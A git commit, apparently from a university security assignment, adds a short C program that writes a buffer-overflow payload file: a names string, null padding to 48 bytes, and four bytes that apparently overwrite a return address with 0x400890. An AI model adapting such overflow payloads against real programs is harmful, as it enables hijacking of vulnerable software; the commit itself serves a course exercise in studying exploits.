521eec68e584fbf7c81f780d677993a1f410419a
Connor Brown <cb4835@princeton.edu>
2023-12-11 01:18:29 -0500

    working B attack

---
+++ createdataB.c
@@ -0,0 +1,23 @@
+#include <stdio.h>
+#include <string.h>
+
+int main (void) {
+    FILE *psFile;
+    char* partners = "Connor & Laura";
+    int i;
+
+    psFile = fopen("dataB", "w");
+
+    fprintf(psFile, "%s", partners);
+
+    for (i = 14; i < 48; i++) {
+        fprintf(psFile, "%c", '\0');
+    }
+
+    fprintf(psFile, "%c", 0x90);
+    fprintf(psFile, "%c", 0x08);
+    fprintf(psFile, "%c", 0x40);
+    fprintf(psFile, "%c", 0x00);
+
+    return 0;
+}
